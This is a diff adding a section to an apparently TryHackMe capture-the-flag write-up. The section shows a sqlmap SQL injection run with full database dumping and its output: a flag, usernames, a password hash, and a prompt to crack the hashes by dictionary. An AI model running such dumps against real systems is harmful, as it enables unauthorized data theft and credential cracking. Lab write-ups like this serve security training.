@@ -438,6 +438,50 @@ Table: nothing_inside
 >> <strong>______</strong>
 <p></p>
 
+<pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
+...
+[22:20:00] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
+[22:20:00] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
+[22:20:00] [INFO] retrieved: 1
+[22:20:00] [INFO] retrieved: THM{1nj3c7_l1k3_4_b055}
+Database: THM_f0und_m3
+Table: nothing_inside
+[1 entry]
++-------------------------+
+| Easter_4                |
++-------------------------+
+| THM{1nj3c7_l1k3_4_b055} |
++-------------------------+
+...
+[22:45:04] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.sqlmap/output/10.10.157.196/dump/THM_f0und_m3/nothing_inside.csv'
+[22:45:04] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
+[22:45:04] [INFO] resumed: 2
+[22:45:04] [INFO] resumed: username
+[22:45:04] [INFO] resumed: password
+[22:45:04] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
+[22:45:04] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
+[22:45:04] [INFO] resumed: 2
+[22:45:04] [INFO] resumed: 05f3672ba34409136aa71b8d00070d1b
+[22:45:04] [INFO] resumed: DesKel
+[22:45:04] [INFO] resumed: He is a nice guy, say hello for me
+[22:45:04] [INFO] resumed: Skidy
+[22:45:04] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[22:45:09] [INFO] writing hashes to a temporary file '/tmp/sqlmapt34iIC14886/sqlmaphashes-XYsiDb.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+
+                                                              
+Database: THM_f0und_m3                                                                                                                      
+Table: user
+[2 entries]
+
+
+  
+</code></pre>
+
+![image](https://github.com/user-attachments/assets/dc41a558-f11a-4fef-98ca-e27711b03a3b)
+
+
 
 
 > 2.6 - <em>Easter 6</em><br>
